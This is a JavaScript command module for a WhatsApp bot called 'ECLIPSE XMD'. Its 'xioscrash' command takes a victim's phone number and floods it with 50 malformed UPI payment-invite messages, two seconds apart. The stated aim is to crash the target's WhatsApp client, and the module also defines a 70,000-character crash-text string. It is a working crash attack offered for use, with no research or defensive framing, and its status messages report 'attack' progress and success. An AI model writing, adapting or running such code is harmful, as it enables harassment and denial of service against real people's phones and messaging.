import config from '../../config.js';

const OWNER_NUMBER = config.ownerNumber.replace(/^\+/, '');
const OWNER_JID = `${OWNER_NUMBER}@s.whatsapp.net`;

const normalizeNumber = (number) => {
  return number.replace(/[^0-9]/g, '');
};

const isValidPhoneNumber = (number) => {
  const cleaned = number.replace(/[^0-9]/g, '');
  return cleaned.length >= 10 && cleaned.length <= 15;
};

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const XEONTEXT6 = `𝐄𝐂𝐋𝐈𝐏𝐒𝐄 𝐗𝐌𝐃` + "ꦾ".repeat(70000);

export default {
  name: 'xioscrash',
  description: '☠️ EXTREME: XiOS Crash - Payment invite bug attack (VERY DANGEROUS)',
  category: 'Bug/Crash',
  usage: `${config.prefix}xioscrash <number>`,
  
  async execute(msg, { sock, args }) {
    const from = msg.key.remoteJid;
    const senderJid = msg.key.participant || msg.key.remoteJid;
    const senderNumber = senderJid.split('@')[0];
    const userName = msg.pushName || "User";

    console.log(`[XIOSCRASH] Command triggered by ${senderJid}`);

    const normalizedSender = normalizeNumber(senderNumber);
    const normalizedOwner = normalizeNumber(OWNER_NUMBER);
    const isOwner = senderJid === OWNER_JID || normalizedSender === normalizedOwner;

    if (!isOwner) {
      console.log(`[XIOSCRASH] Unauthorized access attempt`);
      await sock.sendMessage(from, {
        text: `⛔ *ACCESS DENIED*\n\n❌ Owner-only command. Unauthorized use is prohibited.`
      }, { quoted: msg });
      return;
    }

    if (!args[0]) {
      await sock.sendMessage(from, {
        text: `⚠️ *XIOS CRASH ATTACK*\n\n📋 Usage: ${config.prefix}xioscrash <number>\n📝 Example: ${config.prefix}xioscrash 2348012345678\n\n⚠️ WARNING: Extremely dangerous payment invite bug!`
      }, { quoted: msg });
      return;
    }

    let client = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0] || args[0];
    let clientNumber = client.includes('@s.whatsapp.net') ? client.split('@')[0] : client.replace(/[^0-9]/g, '');

    if (!isValidPhoneNumber(clientNumber)) {
      await sock.sendMessage(from, {
        text: `❌ *INVALID NUMBER*\n\nProvide a valid international number (10-15 digits)`
      }, { quoted: msg });
      return;
    }

    const targetJid = client.includes('@s.whatsapp.net') ? client : `${clientNumber}@s.whatsapp.net`;

    try {
      await sock.sendMessage(from, { react: { text: '💀', key: msg.key } });

      await sock.sendMessage(from, {
        text: `☠️ *XIOS CRASH INITIATED*\n\n🎯 Target: +${clientNumber}\n💥 Type: Payment Invite Bug\n⏳ Launching attack...`
      }, { quoted: msg });

      const amount = 50;
      for (let i = 0; i < amount; i++) {
        await sock.relayMessage(targetJid, {
          paymentInviteMessage: {
            serviceType: "UPI",
            expiryTimestamp: Date.now() + (24 * 60 * 60 * 1000)
          }
        }, {});
        await sleep(2000);
        
        if (i % 10 === 0) {
          console.log(`[XIOSCRASH] Progress: ${i}/${amount}`);
        }
      }

      await sock.sendMessage(from, { react: { text: '✅', key: msg.key } });

      await sock.sendMessage(from, {
        text: `✅ *XIOS CRASH COMPLETED*\n\n🎯 Target: +${clientNumber}\n💥 Payloads Sent: ${amount}x\n📊 Status: Success\n⚠️ Wait 3 minutes before next attack\n\n⚡ ECLIPSE XMD`
      }, { quoted: msg });

      console.log(`[XIOSCRASH] Attack completed on ${clientNumber}`);
    } catch (e) {
      console.log(`[XIOSCRASH] Error: ${e.message}`);
      await sock.sendMessage(from, {
        text: `❌ *ATTACK FAILED*\n\n🎯 Target: +${clientNumber}\n⚠️ Error: ${e.message}`
      }, { quoted: msg });
    }
  }
};
